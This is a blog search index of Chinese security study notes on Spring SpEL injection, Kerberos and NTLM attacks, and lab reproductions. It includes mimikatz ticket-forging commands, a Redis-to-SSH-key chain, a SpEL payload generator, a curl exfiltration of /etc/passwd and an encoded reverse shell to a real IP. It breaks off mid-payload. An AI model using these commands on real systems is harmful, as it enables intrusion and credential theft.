<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Spring漏洞 持续更新中。。。。</title>
    <link href="/2022/03/07/SpringBug/"/>
    <url>/2022/03/07/SpringBug/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBug"><a href="#SpringBug" class="headerlink" title="SpringBug"></a>SpringBug</h1><h3 id="SpEL相关漏洞"><a href="#SpEL相关漏洞" class="headerlink" title="SpEL相关漏洞"></a>SpEL相关漏洞</h3><p>SpEL表达式是spring出产的并且贯穿整个产品的表达式能够执行大多数Java语言能够做到的事情比如（变量，正则，bool，方法调用，创建bean等等）</p><p>最简单的表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) exp.getValue();<br></code></pre></td></tr></table></figure><p>首先介绍一下常见的类</p><blockquote><p>org.springframework.expression.ExpressionParser                     &#x2F;&#x2F;一个表达式解析器</p><p>org.springframework.expression.spel.standard.SpelExpression   &#x2F;&#x2F;表达式对象,使用他的getValue即可执行表达式</p></blockquote><p>下面介绍用该表达式如何引入类:</p><blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/spel-1.png" alt="SpEL-1"></p></blockquote><p>而且SpelExpressionParse这个类里面,被@Nullable修饰,而且默认情况下是,而且默认情况下是StandardEvaluationContext这个类</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/springboot-1.png" alt="springbug-1"></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/springboot-2.png" alt="springbug-2"></p><p>而StandardEvaluationContext他是继承EvaluationContext这个类是一个自动识别表达式的类型的一个类</p><p>EvaluationContext的子类有四个我们一般只用到两个</p><p><strong>SimpleEvaluationContext和StandardEvaluationContext</strong></p><p>SimpleEvaluationContext: 不包含类相关的危险操作，比较安全</p><p>StandardEvaluationContext: 包含所有功能，存在风险（默认加载）</p><p>所以默认来说这个类是比较危险的</p><h4 id="复现CVE-2018-1270"><a href="#复现CVE-2018-1270" class="headerlink" title="复现CVE-2018-1270"></a>复现CVE-2018-1270</h4><p>真实靶场可以使用docker来搭建</p><p>也可以使用docker cp来将文件copy 出来</p><p>当我们拿到这个包可以使用一下方式来查看是否存在危险类</p><p>比如我们要调查危险类org.springframework.expression.spel.standard</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1.png" alt="代码审计-1"></p><blockquote><p>使用这种方式来查找这个包引用了那些类</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2.png" alt="代码审计-2"></p><blockquote><p>这样就能找到这个包是否引用了该类,并且位置在哪里</p></blockquote><p>能够在Java查看是否存在危险类</p><p>关于SpEL表达式最直观的修改方式是将StandardEvaluationContext修改为SimpleEvaluationContext</p><blockquote><p>基本所有的SpEL表达式都是由于这种情况触发的</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Java</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos</title>
    <link href="/2022/03/02/Kerberos/"/>
    <url>/2022/03/02/Kerberos/</url>
    
    <content type="html"><![CDATA[<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p>sam(记录用户的密码)文件位置:%SystemRoot%\system32\config\sam</p><p>使用NTLM hash加密sam文件的密码 32位 数字和字母构成</p><p>使用python来生成NTLM hash</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> passlib.<span class="hljs-built_in">hash</span> <span class="hljs-keyword">import</span> nthash<br>code = nthash.<span class="hljs-built_in">hash</span>(<span class="hljs-string">&quot;123456&quot;</span>)<br><span class="hljs-built_in">print</span>(code)<br>&gt;&gt;32ed87bdb5fdc5e9cba88547376818d4<br></code></pre></td></tr></table></figure><p>转换原理是先对明文进行16进制编码再转换为Unicode编码再进行md4编码</p><h4 id="Windows登录流程"><a href="#Windows登录流程" class="headerlink" title="Windows登录流程"></a>Windows登录流程</h4><p>winlogon.exe适用于管理用户登录和退出的,lsass.exe是微软的安全机制,它用于本地安全和登录策略</p><p>winlogon输入用户名和密码后交给lsass.exe,然后将密码计算出来密文然后去sam比对</p><h3 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h3><p>1.协商</p><p>客户端首先确认服务端的NTLM版本</p><p>2.质询</p><p>客户端向服务器发送一个用户信息(用户名)</p><p>服务端接收后生成一个16进制的challenge然后使用用户名对应的NTLM hash来加密challenge生成challenge1,之后将challenge发送给客户端</p><p>客户端接收后,客户端使用密码计算出自己的NTLM hash来加密challenge2并发送给服务端</p><p>3.验证</p><p>服务端认证challenge1和challenge2</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/kerberos.png" alt="image-20220302192324392"></p><h3 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h3><p>不需要用户名和密码的情况下登录</p><p>条件:</p><p>需要用户名</p><p>需要用户名对应的NTLM hash</p><p>使用工具</p><p>smbmap</p><p>crackMapExec</p><p>Smbexec</p><p>Metasploit</p><h3 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h3><p>服务器以及客户机的计算机管理</p><p>管理域账号</p><p>资源管理</p><p>桌面配置</p><p>应用系统支持</p><h3 id="域认证-Kerberos"><a href="#域认证-Kerberos" class="headerlink" title="域认证(Kerberos)"></a>域认证(Kerberos)</h3><p>有三个角色参与Client、Server、KDC（域控上面的服务，kerberos）</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/kerberos-2.png" alt="image-20220302194123945"></p><p>客户端如果想要获取服务器的权限首先要跟KDC（Kerberos）获取票据</p><p><strong>AS服务器的交互</strong></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-3.png" alt="image-20220302194516022"></p><p>1.的数据包含：</p><ul><li>client hash加密timestamp，用户KDC身份认证</li><li>Client info(域名\域账户) 用于KDC查找Client的hash</li><li>server info （TGS）</li></ul><p>2.的数据包含</p><ul><li>Client pass<ul><li>用Client hash加密Session Key</li></ul></li><li>KDC pass<ul><li>KDC hash 加密TGT</li><li>Session Key</li><li>Client info(域名\域账户)</li><li>End Time 票据的有效期</li></ul></li></ul><p><strong>TGS服务器的交互</strong></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-4.png" alt="image-20220302200331534"></p><p>1.数据包含</p><ul><li>用上一步的Session Key加密client info和时间戳</li><li>client info(域名\域账户)</li><li>server info</li></ul><p>2.数据包含</p><ul><li>session key加密server session key</li><li>server hash（Ticket）</li></ul><p><strong>与server端交互</strong></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-5.png" alt="image-20220302200947446"></p><p>认证的流量抓包</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-6.png" alt="kerberos-6"></p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p><strong>条件</strong></p><ul><li>不需要和KDC交互</li><li>需要目标的NTLM hash</li></ul><p><strong>防御</strong></p><p>需要开启PAC</p><p>一般的ticket构造为:</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-7.png" alt="kerberos-7"></p><p>可以使用mimikatz来伪造白银票据</p><p>kerberos::list &#x3D;&#x3D;列出票据&#x3D;&#x3D;</p><p>kerberos::purge &#x3D;&#x3D;清除票据&#x3D;&#x3D;</p><p>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”&gt;log.txt  &#x3D;&#x3D;导出票据&#x3D;&#x3D;</p><p>mimikatz.exe “kerberos::golden &#x2F;domain:域名 &#x2F;sid:域sid &#x2F;target:目标服务器的主机名 &#x2F;service:服务类型 &#x2F;rc4:NTLM hash &#x2F;user:用户名 &#x2F;ptt” exit &#x3D;&#x3D;生成票据到内存(用户名可以随便写因为他不会去验证)&#x3D;&#x3D;</p><p>服务类型看这里</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-8.png" alt="kerberos-8"></p><p>防御:</p><p>1.尽量保证服务器凭证不被窃取</p><p>2.开启PAC(每次提交票据都需要验证)</p><p>开启PAC方法HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parametes中的ValidateKdcPacSignature设置为1</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p><strong>条件</strong></p><ul><li>需要DC通信</li><li>需要krbtgt用户的hash(就是KDC hash)</li></ul><p><strong>特点</strong></p><p>能够持久性的隐藏,日志无法溯源,拿到DC权限后能够长时间控制域</p><p><strong>防御:</strong></p><p>需要经常换密码.最根本的方法是不允许域管理账号登录到其他的服务器</p><p><strong>使用msf的kiwi模块</strong></p><p>session -i 1</p><p>load kimi              (加载进来以后可以使用帮助命令查看有哪些功能)</p><p>kerberos_ticket_list</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-9.png" alt="kerberos-9"></p><p>mimikatz.exe “kerberos::golden &#x2F;domain:域名 &#x2F;sid:域sid &#x2F;target:目标服务器的主机名 &#x2F;service:服务类型 &#x2F;rc4:&lt;KRBTGT NTLM hash&gt; &#x2F;user:用户名 &#x2F;ptt” exit &#x3D;&#x3D;生成票据到内存(用户名可以随便写因为他不会去验证)&#x3D;&#x3D;</p><h3 id="Windows-access-token"><a href="#Windows-access-token" class="headerlink" title="Windows access token"></a>Windows access token</h3><p>每一个进程创建的时候会根据用户权限生成一个access token</p><p>access token分为两种一个是主令牌,一个是从令牌</p><p>当用户注销的时候会将主令牌切换到从令牌,但是不会清除令牌只有重启的时候才会清除</p><p>令牌格式如下:</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Kerberos-10.png" alt="kerberos-10"></p><p><strong>使用工具如下:</strong></p><p>MSF - incognit</p><blockquote><p>使用方法:</p><p>getsystem</p><p>load incognit</p><p>list_tokens -u</p><p>impersonate_token “token名称”</p></blockquote><p>Cobalt Strike - steal_token</p><p>PowerShell - invoke-TokenManipulation.ps1</p><p><strong>防御:</strong></p><p>禁止Domain Admins 登录对外并且未进行安全加固的服务器 </p><blockquote><p>通过下面的视频来学习结果</p><p><a href="https://www.bilibili.com/video/BV1S4411q7Cw?from=search&amp;seid=12934597128076560758&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1S4411q7Cw?from=search&amp;seid=12934597128076560758&amp;spm_id_from=333.337.0.0</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现</title>
    <link href="/2022/02/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/02/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="CVE-2012-2122Mysql身份认证漏洞"><a href="#CVE-2012-2122Mysql身份认证漏洞" class="headerlink" title="CVE-2012-2122Mysql身份认证漏洞"></a>CVE-2012-2122Mysql身份认证漏洞</h3><p>进入MySQL靶场</p><h3 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h3><blockquote><p>首先使用ssh-keygen -t rsa 来生成一个密钥 #生成密钥</p><p>cd &#x2F;root&#x2F;.ssh</p><p>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt #密钥输出</p><p>cat key.txt|redis-cli -h ip地址 -p 端口 -x set crack #写入密钥</p><p>redis-cli -h ip地址 -p 端口 #匿名连接</p><p>config set dir &#x2F;root&#x2F;.ssh #设置redis备份文件的目录</p><p>config set dbfilename authorized_keys #设置文件名</p><p>save #保存文件</p><p>exit</p><p>ssh -i id_rsa root@ip地址 #使用ssh连接</p></blockquote><p>防御方法</p><p>1.将redis.conf的bind设置为127.0.0.1</p><p>2.在redis.conf文件找到requirepass设置登录的认证</p><h3 id="Spring-SpEL表达式漏洞"><a href="#Spring-SpEL表达式漏洞" class="headerlink" title="Spring SpEL表达式漏洞"></a>Spring SpEL表达式漏洞</h3><blockquote><p>这个接口是用来解析SpEL表达式,如果为做好屏蔽则会产生漏洞(他的实现类也要注意)</p><p>org.springframework.expression.ExpressionParser     &#x2F;&#x2F;<strong>表示解析器</strong></p><p>org.springframework.expression.spel.standard.SpelExpression &#x2F;&#x2F;表达式对象  (&#x3D;&#x3D;getValue()方法用来进行计算时会调用代码&#x3D;&#x3D;)</p><p>其中表达式关于类的引入</p><p><img src="/.com//....%5Cpublic%5Cimg%5CSpEL-1.png" alt="image-20220305190602756"></p></blockquote><p>​</p><h4 id="SimpleEvaluationContext和StandardEvaluationContext"><a href="#SimpleEvaluationContext和StandardEvaluationContext" class="headerlink" title="SimpleEvaluationContext和StandardEvaluationContext"></a><strong>SimpleEvaluationContext和StandardEvaluationContext</strong></h4><p>SimpleEvaluationContext: 不包含类相关的危险操作，比较安全</p><p>StandardEvaluationContext: 包含所有功能，存在风险（默认加载）</p><p>关于SpEL表达式</p><p><a href="https://www.jianshu.com/p/e0b50053b5d3">https://www.jianshu.com/p/e0b50053b5d3</a></p><p>用法一共有三种</p><p>1.@Value中使用如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;表达式&#125;&quot;)</span><br></code></pre></td></tr></table></figure><p>2.XML配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.java.XXXXX.xx&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;arg&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;表达式&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.在代码中执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//创建ExpressionParser解析表达式</span><br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-comment">//表达式放置</span><br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;表达式&quot;</span>);<br>    <span class="hljs-comment">//执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> exp.getValue();<br>    <span class="hljs-comment">/**如果使用其他的容器，则用下面的方法*/</span><br>    <span class="hljs-comment">//创建一个虚拟的容器EvaluationContext，注册一个函数</span><br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-comment">//向容器内添加bean</span><br>    <span class="hljs-type">BeanA</span> <span class="hljs-variable">beanA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanA</span>();<br>    ctx.setVariable(<span class="hljs-string">&quot;bean_id&quot;</span>, beanA);<br>    <span class="hljs-comment">//setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br>    ctx.setRootObject(XXX);<br>    <span class="hljs-comment">//getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> exp.getValue(ctx);<br>&#125;<br></code></pre></td></tr></table></figure><p>还可以调用对象(需要@Bean)变量,函数,正则,运算符,Elvis</p><blockquote><p><strong>root和this</strong></p><p>SpEL中#root总是指的刚开始的表达式对象，而#this总是指的当前的表达式对象，用他们可以直接操作当前上下文。</p></blockquote><h4 id="框架特征检测"><a href="#框架特征检测" class="headerlink" title="框架特征检测:"></a><strong>框架特征检测:</strong></h4><p>1.spring框架的默认图标为favicon.ico图标</p><p>2.springboot 4xx,5xx的默认报错页面</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cspringboot-1" alt="image-20210529225327692.png"></p><p>3.Wappalyzer 插件识别</p><p>4.X-Application-Context</p><h4 id="首先CVE-2016-4977"><a href="#首先CVE-2016-4977" class="headerlink" title="首先CVE-2016-4977"></a><strong>首先CVE-2016-4977</strong></h4><p>vulhub提供了poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter message to encode:&#x27;</span>)<br><br>poc = <span class="hljs-string">&#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   poc += <span class="hljs-string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch)<br>poc += <span class="hljs-string">&#x27;)&#125;&#x27;</span><br><br><span class="hljs-built_in">print</span>(poc)<br></code></pre></td></tr></table></figure><blockquote><p>curl 攻击端ip:攻击端端口 -d “$(cat &#x2F;etc&#x2F;passwd)” </p><p>使用curl 来测试返回在是否能发送数据，-d代表发送数据 </p><p>使用nc 监听端口即可收到消息</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuNC4yNi84ODg4IDA+JjE&#x3D;}|{base64,-d}|{bash,-i} </p><p>反弹shell并用poc生成字节码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;$&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>)<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">32</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">32</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">101</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">111</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">89</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">109</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">70</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">122</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">116</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">83</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">43</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">74</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">118</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">90</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">71</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">86</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">50</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">76</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">51</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">82</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">56</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">120</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">122</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">85</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">117</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">77</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span 